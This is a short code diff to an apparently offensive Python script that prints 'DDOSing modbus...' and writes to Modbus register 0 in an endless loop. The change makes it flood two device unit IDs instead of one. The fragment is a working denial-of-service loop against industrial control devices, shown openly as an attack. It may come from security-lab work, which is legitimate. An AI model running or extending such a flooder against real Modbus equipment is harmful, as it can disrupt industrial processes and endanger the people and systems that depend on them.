@@ -9,7 +9,8 @@ def main():
     print("DDOSing modbus...")
     try:
         while True:
-            client.write_register(0,0,unit=0)
+            client.write_register(0,0,unit=1)
+            client.write_register(0,0,unit=2)
     except:
         print("Exiting")
 if __name__=="__main__":
